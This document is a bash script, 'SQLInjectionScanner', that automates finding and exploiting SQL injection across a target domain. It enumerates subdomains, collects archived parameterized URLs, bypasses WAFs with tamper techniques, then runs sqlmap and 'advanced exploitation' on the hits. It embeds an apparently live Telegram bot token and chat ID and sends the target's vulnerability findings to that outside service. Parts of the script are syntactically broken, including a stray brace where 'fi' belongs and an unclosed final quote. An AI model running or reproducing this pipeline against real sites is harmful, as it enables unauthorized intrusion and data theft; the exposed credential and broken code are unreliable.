#!/bin/bash
# SQLInjectionScanner - Advanced SQL Injection discovery & exploitation script
#
# Usage: ./sqli_scanner.sh <target-domain> [options]
#
# Options:
#   --auto-sqlmap         Automatically run sqlmap on found vulnerabilities
#   --threads <num>       Set number of concurrent threads (default: 10)
#   --proxy <proxy>       Use proxy (format: http://proxy:port)
#   --proxy-list <file>   Rotate through proxies in the specified file
#   --auth <method>       Authentication method: basic, digest, ntlm
#   --user <username>     Username for authentication
#   --pass <password>     Password for authentication
#   --cookie <cookie>     Cookie string for authenticated scanning
#   --headers <file>      File containing custom headers
#   --verbose             Enable verbose output
#   --report-format <fmt> Report format (options: txt,html,json,csv,xml,all)
#   --timeout <sec>       Request timeout in seconds (default: 10)
#   --user-agent <ua>     Custom User-Agent string
#   --encode-level <lvl>  Payload encoding level (1-3)
#   --tamper <techniques> Comma-separated tamper techniques
#   --auto-waf            Auto-detect WAF and use appropriate bypass techniques
#   --list-tampers        List available tamper techniques
#   --payload-types <type> Comma-separated payload types to use (default: all)
#   --db-detect           Automatically detect database type for better payloads
#   --generate-payloads   Generate comprehensive payload files for all databases
#
# Description:
# This script scans domains for SQL injection vulnerabilities using advanced techniques.
# It discovers subdomains, gathers parameterized URLs, checks for SQLi via multiple methods,
# and can exploit vulnerabilities with sqlmap. **USE ONLY ON AUTHORIZED TARGETS.**

# Load modules
# shellcheck source=sqli_core.sh
. "./sqli_core.sh"
# shellcheck source=sqli_report.sh
. "./sqli_report.sh"
# shellcheck source=sqli_detect.sh
. "./sqli_detect.sh"
# shellcheck source=sqli_exploit.sh
. "./sqli_exploit.sh"
# shellcheck source=sqli_waf.sh
. "./sqli_waf.sh"
# shellcheck source=sqli_payloads.sh
. "./sqli_payloads.sh"

# ------------------------- Configuration and Checks -------------------------

# Default settings
THREADS=10
TIMEOUT=10
VERBOSE=false
ENCODE_LEVEL=1
REPORT_FORMAT="txt"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
USE_PROXY=false
PROXY_ROTATION=false
AUTH_METHOD=""
USERNAME=""
PASSWORD=""
COOKIE=""
CUSTOM_HEADERS=""
AUTO_SQLMAP=false
AUTO_WAF_DETECT=false
DB_DETECT=false
TAMPER_TECHNIQUES=""
PAYLOAD_TYPES="all"
GENERATE_PAYLOADS=false

# Telegram configuration
TELEGRAM_BOT_TOKEN="7633509671:AAG0uVyYpZkzmvyMysCMwKZw6tjHEne6b6c"
TELEGRAM_CHAT_ID="1869521835"
NOTIFY=true

# Generate a unique scan ID
SCAN_ID=$(generate_scan_id)

# Check if command is --list-tampers
if [[ "$1" == "--list-tampers" ]]; then
  echo "Available tamper techniques:"
  list_tamper_techniques | sort | nl
  exit 0
fi

# Check if domain is provided
if [[ $# -lt 1 ]]; then
  echo "Usage: $0 <domain> [options]"
  echo "For help: $0 --help"
  exit 1
fi

# Help message
if [[ "$1" == "--help" ]]; then
  echo "SQLInjectionScanner - Advanced SQL Injection discovery & exploitation script"
  echo ""
  echo "Usage: $0 <target-domain> [options]"
  echo ""
  echo "Options:"
  echo "  --auto-sqlmap         Automatically run sqlmap on found vulnerabilities"
  echo "  --threads <num>       Set number of concurrent threads (default: 10)"
  echo "  --proxy <proxy>       Use proxy (format: http://proxy:port)"
  echo "  --proxy-list <file>   Rotate through proxies in the specified file"
  echo "  --auth <method>       Authentication method: basic, digest, ntlm"
  echo "  --user <username>     Username for authentication"
  echo "  --pass <password>     Password for authentication"
  echo "  --cookie <cookie>     Cookie string for authenticated scanning"
  echo "  --headers <file>      File containing custom headers"
  echo "  --verbose             Enable verbose output"
  echo "  --report-format <fmt> Report format (options: txt,html,json,csv,xml,all)"
  echo "  --timeout <sec>       Request timeout in seconds (default: 10)"
  echo "  --user-agent <ua>     Custom User-Agent string"
  echo "  --encode-level <lvl>  Payload encoding level (1-3)"
  echo "  --tamper <techniques> Comma-separated tamper techniques"
  echo "  --auto-waf            Auto-detect WAF and use appropriate bypass techniques"
  echo "  --list-tampers        List available tamper techniques"
  echo "  --payload-types <type> Comma-separated payload types to use (default: all)"
  echo "  --db-detect           Automatically detect database type for better payloads"
  echo "  --generate-payloads   Generate comprehensive payload files for all databases"
  exit 0
fi

TARGET_DOMAIN="$1"
shift

# Parse command line arguments
while [[ $# -gt 0 ]]; do
  case "$1" in
    --auto-sqlmap)
      AUTO_SQLMAP=true
      shift
      ;;
    --threads)
      THREADS="$2"
      shift 2
      ;;
    --proxy)
      USE_PROXY=true
      PROXY="$2"
      shift 2
      ;;
    --proxy-list)
      USE_PROXY=true
      PROXY_ROTATION=true
      PROXY_LIST="$2"
      shift 2
      ;;
    --auth)
      AUTH_METHOD="$2"
      shift 2
      ;;
    --user)
      USERNAME="$2"
      shift 2
      ;;
    --pass)
      PASSWORD="$2"
      shift 2
      ;;
    --cookie)
      COOKIE="$2"
      shift 2
      ;;
    --headers)
      CUSTOM_HEADERS="$2"
      shift 2
      ;;
    --verbose)
      VERBOSE=true
      shift
      ;;
    --report-format)
      REPORT_FORMAT="$2"
      shift 2
      ;;
    --timeout)
      TIMEOUT="$2"
      shift 2
      ;;
    --user-agent)
      USER_AGENT="$2"
      shift 2
      ;;
    --encode-level)
      ENCODE_LEVEL="$2"
      shift 2
      ;;
    --tamper)
      TAMPER_TECHNIQUES="$2"
      shift 2
      ;;
    --auto-waf)
      AUTO_WAF_DETECT=true
      shift
      ;;
    --payload-types)
      PAYLOAD_TYPES="$2"
      shift 2
      ;;
    --db-detect)
      DB_DETECT=true
      shift
      ;;
    --generate-payloads)
      GENERATE_PAYLOADS=true
      shift
      ;;
    *)
      echo "Unknown option: $1"
      echo "Use --help for usage information"
      exit 1
      ;;
  esac
done

# Export variables for use in modules
export THREADS TIMEOUT VERBOSE ENCODE_LEVEL REPORT_FORMAT USER_AGENT
export USE_PROXY PROXY_ROTATION PROXY AUTH_METHOD USERNAME PASSWORD COOKIE CUSTOM_HEADERS
export AUTO_SQLMAP AUTO_WAF_DETECT TAMPER_TECHNIQUES PAYLOAD_TYPES DB_DETECT
export TELEGRAM_BOT_TOKEN TELEGRAM_CHAT_ID NOTIFY
export TARGET_DOMAIN SCAN_ID

# Check for required external tools
REQUIRED_TOOLS=(subfinder gau uro httpx sqlmap curl jq bc)
missing_tools=()
for tool in "${REQUIRED_TOOLS[@]}"; do
  if ! command -v "$tool" &>/dev/null; then
    missing_tools+=("$tool")
  fi
done
if (( ${#missing_tools[@]} > 0 )); then
  echo "[ERROR] Missing required tools: ${missing_tools[*]}."
  echo "Please install the above tool(s) before running the script."
  exit 1
fi

# Display confirmation prompt with legal warning
echo "=========================================================="
echo " Target Domain: $TARGET_DOMAIN"
echo " Scan ID: $SCAN_ID"
echo " This script will perform SQL Injection tests on the target."
echo " Ensure you have legal permission to test ${TARGET_DOMAIN}!"
echo " Unauthorized attacks are illegal. Proceed at your own risk."
echo "=========================================================="
read -r -p "Do you want to continue? (y/N): " confirm
if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
  echo "Scan aborted by user."
  exit 0
fi

# ---------------------------- Setup Output ----------------------------

TIMESTAMP="$(date '+%Y-%m-%d_%H-%M-%S')"
OUTPUT_DIR="results/${TARGET_DOMAIN}/${TIMESTAMP}"
mkdir -p "$OUTPUT_DIR"
LOG_FILE="${OUTPUT_DIR}/scan.log"
export OUTPUT_DIR LOG_FILE

# Log start time
log "INFO" "Scan started at $(date) with ID: $SCAN_ID"
if $VERBOSE; then
  log "VERBOSE" "Verbosity enabled"
  log "VERBOSE" "Output directory: $OUTPUT_DIR"
  log "VERBOSE" "Threads: $THREADS"
  log "VERBOSE" "Timeout: $TIMEOUT seconds"
  log "VERBOSE" "Encoding level: $ENCODE_LEVEL"
  if [[ -n "$TAMPER_TECHNIQUES" ]]; then
    log "VERBOSE" "Tamper techniques: $TAMPER_TECHNIQUES"
  fi
  if $AUTO_WAF_DETECT; then
    log "VERBOSE" "Auto WAF detection enabled"
  fi
  if $DB_DETECT; then
    log "VERBOSE" "Database type detection enabled"
  fi
  if $GENERATE_PAYLOADS; then
    log "VERBOSE" "Auto payload generation enabled"
  fi
}

# Generate all payloads if requested
if $GENERATE_PAYLOADS; then
  log "INFO" "Generating comprehensive payload files for all database types..."
  generate_all_payloads
fi

# ----------------------- Subdomain Enumeration ------------------------

log "INFO" "Enumerating subdomains for ${TARGET_DOMAIN}..."

# Run subfinder with increased threads
subfinder -silent -d "$TARGET_DOMAIN" -t "$THREADS" -o "${OUTPUT_DIR}/subdomains.txt"

# Ensure root domain is included in the list (if not found by subfinder)
grep -Fxq "$TARGET_DOMAIN" "${OUTPUT_DIR}/subdomains.txt" || echo "$TARGET_DOMAIN" >> "${OUTPUT_DIR}/subdomains.txt"
SUBCOUNT=$(wc -l < "${OUTPUT_DIR}/subdomains.txt" || echo 0)
log "INFO" "Found ${SUBCOUNT} subdomains (including root domain)."
export SUBCOUNT

# ---------------------- URL Collection (gau + uro) --------------------

log "INFO" "Gathering URLs from Wayback/OTX/etc (using gau)..."
# Use gau to fetch URLs for all subdomains, then deduplicate with uro
# Gau can read from stdin; use concurrency threads for speed
cat "${OUTPUT_DIR}/subdomains.txt" | gau --threads "$THREADS" | tee "${OUTPUT_DIR}/urls_raw.txt" | uro > "${OUTPUT_DIR}/urls.txt"
URLCOUNT=$(wc -l < "${OUTPUT_DIR}/urls.txt" || echo 0)
log "INFO" "Collected ~${URLCOUNT} unique URLs after deduplication."
export URLCOUNT

# ------------------ Filter Parameterized URLs -------------------------

log "INFO" "Filtering URLs with parameters (\"?\")..."
grep -F "?" "${OUTPUT_DIR}/urls.txt" > "${OUTPUT_DIR}/param_urls.txt" || true
PARAM_URL_COUNT=$(wc -l < "${OUTPUT_DIR}/param_urls.txt" || echo 0)
if [[ $PARAM_URL_COUNT -eq 0 ]]; then
  log "ERROR" "No parameterized URLs found. SQLi scan will not proceed."
  exit 0
fi
log "INFO" "Identified $PARAM_URL_COUNT URLs with parameters to test."
export PARAM_URL_COUNT

# -------------------- Live Endpoint Check (httpx) ---------------------

log "INFO" "Checking which parameterized URLs are live (HTTP 200)..."
# Use httpx with threads for faster processing
httpx -silent -l "${OUTPUT_DIR}/param_urls.txt" -mc 200 -threads "$THREADS" -o "${OUTPUT_DIR}/live_urls.txt"
LIVE_URL_COUNT=$(wc -l < "${OUTPUT_DIR}/live_urls.txt" || echo 0)
if [[ $LIVE_URL_COUNT -eq 0 ]]; then
  log "ERROR" "No live parameterized endpoints (HTTP 200) were found. Exiting."
  exit 0
fi
log "INFO" "Found $LIVE_URL_COUNT live parameterized URLs for testing."
export LIVE_URL_COUNT

# ------------------ WAF Detection (if enabled) -----------------------

if $AUTO_WAF_DETECT; then
  log "INFO" "Running advanced WAF detection..."
  # Get first live URL for WAF testing
  sample_url=$(head -1 "${OUTPUT_DIR}/live_urls.txt")
  # Use the new advanced WAF detection
  waf_strategy=$(get_waf_bypass_strategy "$sample_url")
  
  # Parse the results
  WAF_TYPE=$(echo "$waf_strategy" | cut -d':' -f1)
  detected_tamper=$(echo "$waf_strategy" | cut -d':' -f2)
  
  if [[ "$WAF_TYPE" != "none" ]]; then
    TAMPER_TECHNIQUES="$detected_tamper"
    log "INFO" "WAF detected: $WAF_TYPE"
    log "INFO" "Using WAF bypass techniques: $TAMPER_TECHNIQUES"
  else
    log "INFO" "No WAF detected on target."
    # If no tamper provided and not auto-detecting, use default
    if [[ -z "$TAMPER_TECHNIQUES" ]]; then
      TAMPER_TECHNIQUES="space2comment,between,percentage,randomcase"
      log "INFO" "Using default tamper techniques: $TAMPER_TECHNIQUES"
    fi
  fi
elif [[ -z "$TAMPER_TECHNIQUES" ]]; then
  # If no tamper provided and not auto-detecting, use default
  TAMPER_TECHNIQUES="space2comment,between,percentage,randomcase"
  log "INFO" "Using default tamper techniques: $TAMPER_TECHNIQUES"
fi
export TAMPER_TECHNIQUES WAF_TYPE

# --------------------- SQL Injection Testing --------------------------

log "INFO" "Testing for SQL injection vulnerabilities..."
VULN_COUNT=0
VULN_LIST=()  # to store vulnerable "URL param" combos
DB_TYPES=()   # to store detected database types

# Create empty vulnerabilities file
touch "${OUTPUT_DIR}/vulnerabilities.txt"
mkdir -p "${OUTPUT_DIR}/vulns"

# Process URLs in parallel with GNU parallel if available
if command -v parallel &>/dev/null; then
  log "INFO" "Using parallel processing for faster scanning..."
  
  # Create a function to test a single URL
  test_url_wrapper() {
    local url="$1"
    local db_type="unknown"
    
    # First, check if database detection is enabled
    if $DB_DETECT; then
      # Get parameter name from URL
      local param_name=$(echo "$url" | grep -o '?[^=]*=' | tr -d '?=' | head -1)
      db_type=$(detect_db_type "$url" "$param_name")
      # Store the detected DB type
      echo "$url:$db_type" >> "${OUTPUT_DIR}/db_types.txt"
      log "INFO" "Detected database type for $url: $db_type"
      
      # Load enhanced payloads based on DB type
      if test_url_for_sqli "$url" "$TAMPER_TECHNIQUES" "$db_type"; then
        # Generate unique vulnerability ID
        local vuln_id=$(generate_vuln_id "$url" "$param_name" "SQLi")
        # Store vulnerability details
        echo "$vuln_id:$url:$param_name:$db_type" >> "${OUTPUT_DIR}/vuln_details.txt"
        # Found vulnerability
        echo "Found vulnerability in $url (DB: $db_type, ID: $vuln_id)"
      fi
    else
      # Standard testing without DB detection
      if test_url_for_sqli "$url" "$TAMPER_TECHNIQUES"; then
        # Found vulnerability
        echo "Found vulnerability in $url"
      fi
    fi
  }
  export -f test_url_wrapper
  
  # Run in parallel with limited number of jobs
  cat "${OUTPUT_DIR}/live_urls.txt" | parallel -j "$THREADS" test_url_wrapper
else
  # Traditional sequential processing
  log "INFO" "Sequential processing (install GNU parallel for faster scans)..."
  
  while IFS= read -r url; do
    if $DB_DETECT; then
      # Get parameter name from URL
      param_name=$(echo "$url" | grep -o '?[^=]*=' | tr -d '?=' | head -1)
      db_type=$(detect_db_type "$url" "$param_name")
      # Store the detected DB type
      echo "$url:$db_type" >> "${OUTPUT_DIR}/db_types.txt"
      log "INFO" "Detected database type for $url: $db_type"
      
      # Test with appropriate payloads for DB type
      if test_url_for_sqli "$url" "$TAMPER_TECHNIQUES" "$db_type"; then
        # Generate unique vulnerability ID
        vuln_id=$(generate_vuln_id "$url" "$param_name" "SQLi")
        # Store vulnerability details
        echo "$vuln_id:$url:$param_name:$db_type" >> "${OUTPUT_DIR}/vuln_details.txt"
        # Found vulnerability
        log "SUCCESS" "Found vulnerability in $url (DB: $db_type, ID: $vuln_id)"
      fi
    else
      # Standard testing without DB detection
      if test_url_for_sqli "$url" "$TAMPER_TECHNIQUES"; then
        # Vulnerability found and logged inside the function
        continue
      fi
    fi
  done < "${OUTPUT_DIR}/live_urls.txt"
fi

# Count how many vulnerabilities were found
VULN_COUNT=$(wc -l < "${OUTPUT_DIR}/vulnerabilities.txt" || echo 0)
export VULN_COUNT

# ---------------------- Summary and Reporting -------------------------

if [[ $VULN_COUNT -gt 0 ]]; then
  log "INFO" "SQL Injection vulnerabilities found: $VULN_COUNT"
  log "INFO" "Details saved to ${OUTPUT_DIR}/vulnerabilities.txt"
  
  # If we have detailed vulnerability info, create structured report
  if [[ -f "${OUTPUT_DIR}/vuln_details.txt" ]]; then
    log "INFO" "Creating detailed vulnerability report..."
    {
      echo "# SQL Injection Vulnerabilities Report"
      echo "## Target: $TARGET_DOMAIN"
      echo "## Scan ID: $SCAN_ID"
      echo "## Date: $(date)"
      echo "## Vulnerabilities Found: $VULN_COUNT"
      echo ""
      
      echo "| Vulnerability ID | URL | Parameter | Database Type | Details |"
      echo "|------------------|-----|-----------|--------------|---------|"
      
      while IFS=: read -r vuln_id url param db_type; do
        # Find the details from the main vulnerabilities file
        details=$(grep -F "$url [$param]" "${OUTPUT_DIR}/vulnerabilities.txt" | cut -d'-' -f2- | xargs)
        echo "| $vuln_id | $url | $param | $db_type | $details |"
      done < "${OUTPUT_DIR}/vuln_details.txt"
    } > "${OUTPUT_DIR}/detailed_report.md"
  fi
  
  # Send summary via Telegram
  summary="✅ Scan complete for ${TARGET_DOMAIN}. Found ${VULN_COUNT} potential SQLi vuln(s)."
  if $NOTIFY; then
    send_telegram "$summary"
    # Optionally, send the list of vulns as well (if not too long)
    if (( VULN_COUNT <= 5 )); then
      while IFS= read -r vuln; do
        send_telegram " - $vuln"
      done < "${OUTPUT_DIR}/vulnerabilities.txt"
    fi
  fi
else
  log "INFO" "No SQL injection vulnerabilities found on ${TARGET_DOMAIN}."
  if $NOTIFY; then
    send_telegram "✅ Scan complete for ${TARGET_DOMAIN}. No SQLi vulnerabilities found."
  fi
fi

# Generate reports
if [[ $VULN_COUNT -gt 0 || "$REPORT_FORMAT" != "txt" ]]; then
  log "INFO" "Generating reports in $REPORT_FORMAT format..."
  generate_report "$REPORT_FORMAT"
fi

# Create summary
create_scan_summary

# ------------------- Optional Auto-Exploitation -----------------------

if $AUTO_SQLMAP && [[ $VULN_COUNT -gt 0 ]]; then
  log "INFO" "Starting automated sqlmap exploitation on found issues..."
  
  # Create a directory for SQLmap results
  mkdir -p "${OUTPUT_DIR}/sqlmap"
  
  # Process each vulnerability with SQLmap
  while IFS= read -r vuln_entry; do
    # vuln_entry format: URL [param] - Type: details
    # Extract URL and param name using bash string parsing:
    vuln_url="${vuln_entry%% \[*}"          # up to first " ["
    param_segment="${vuln_entry#* \[}"     # drop everything up to " ["
    param_name="${param_segment%%\]*}"     # take everything before the "]"
    
    # Get DB type if available
    db_type="unknown"
    if [[ -f "${OUTPUT_DIR}/db_types.txt" ]]; then
      db_type=$(grep -F "$vuln_url:" "${OUTPUT_DIR}/db_types.txt" | cut -d':' -f2 || echo "unknown")
    fi
    
    log "INFO" "Running SQLmap on ${vuln_url} with parameter ${param_name} (DB: $db_type)"
    run_sqlmap_on_vuln "$vuln_url" "$param_name" "$TAMPER_TECHNIQUES" "$db_type"
    
    # Ask about advanced exploitation
    if [[ "$AUTO_SQLMAP" == "true" ]]; then
      read -r -p "Run advanced exploitation on this vulnerability? (y/N): " adv_confirm
      if [[ "$adv_confirm" == "y" || "$adv_confirm" == "Y" ]]; then
        run_advanced_exploitation "$vuln_url" "$param_name" "$TAMPER_TECHNIQUES" "$db_type"
      fi
    fi
  done < "${OUTPUT_DIR}/vulnerabilities.txt"
fi

log "INFO" "Scan finished at $(date). Results are in ${OUTPUT_DIR}/"
echo "Thank you for using SQLInjectionScanner! Results are available in ${OUTPUT_DIR}/"
echo "Scan ID: $SCAN_ID